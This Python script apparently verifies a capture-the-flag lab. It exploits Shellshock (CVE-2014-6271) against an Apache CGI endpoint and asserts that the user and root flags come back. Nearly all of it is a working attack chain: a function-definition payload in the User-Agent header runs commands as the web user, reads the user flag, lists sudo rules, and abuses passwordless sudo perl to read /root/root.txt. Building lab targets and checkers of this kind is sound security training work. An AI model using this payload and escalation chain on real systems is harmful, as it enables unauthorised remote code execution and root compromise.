#!/usr/bin/env python3
"""Independent HTTP attacker for authentic GNU Bash 4.3 / Apache CGI Shellshock."""
import os
import socket
import urllib.error
import urllib.parse
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://shocker-target").rstrip("/")
EXPECTED_USER_FLAG = os.environ["EXPECTED_USER_FLAG"]
EXPECTED_ROOT_FLAG = os.environ["EXPECTED_ROOT_FLAG"]


def request(path, user_agent=None):
    req = urllib.request.Request(BASE + path)
    if user_agent:
        req.add_header("User-Agent", user_agent)
    try:
        with urllib.request.urlopen(req, timeout=12) as response:
            return response.status, response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", errors="replace")


def shellshock(command):
    # Apache passes User-Agent to the genuine CGI process as HTTP_USER_AGENT.
    # Vulnerable Bash 4.3 parses the function-shaped value before user.sh runs.
    payload = "() { :;}; printf 'Content-Type: text/plain\\r\\n\\r\\n'; " + command
    return request("/cgi-bin/user.sh", payload)


host = urllib.parse.urlsplit(BASE).hostname
with socket.create_connection((host, 2222), timeout=5) as sock:
    banner = sock.recv(180)
    assert banner.startswith(b"SSH-2.0-"), f"Expected native OpenSSH 2222, got {banner[:80]!r}"

status, homepage = request("/")
assert status == 200 and "Don't Bug Me!" in homepage
assert "/cgi-bin/" not in homepage, "Do not reveal the discovery path in the landing page"
status, directory = request("/cgi-bin/")
assert status in (403, 404), f"CGI directory should not be listed: {status}"
status, normal = request("/cgi-bin/user.sh")
assert status == 200 and "Just an uptime test script" in normal
assert "uptime" in normal.lower() or "load average" in normal.lower()
print("PASS: ordinary site, unlinked native CGI and normal uptime behavior", flush=True)

status, identity = shellshock("/usr/bin/id")
assert status == 200 and "uid=1001(shelly)" in identity, identity[:800]
print("PASS: CVE-2014-6271 executes through Apache CGI as shelly UID 1001", flush=True)

status, user_flag = shellshock("/bin/cat /home/shelly/user.txt")
assert status == 200 and EXPECTED_USER_FLAG in user_flag, user_flag[:800]
print("PASS: exact per-instance User Flag recovered through Shellshock", flush=True)

status, sudo_rules = shellshock("/usr/bin/sudo -n -l")
assert status == 200 and "/usr/bin/perl" in sudo_rules and "NOPASSWD" in sudo_rules, sudo_rules[:800]
print("PASS: actual sudoers rule permits passwordless Perl", flush=True)

root_command = (
    "/usr/bin/sudo -n /usr/bin/perl -e "
    "'open(F, q{<}, q{/root/root.txt}) or die $!; print while <F>'"
)
status, root_flag = shellshock(root_command)
assert status == 200 and EXPECTED_ROOT_FLAG in root_flag, root_flag[:1200]
print("PASS: Shellshock -> native sudo Perl -> exact per-instance Root Flag", flush=True)
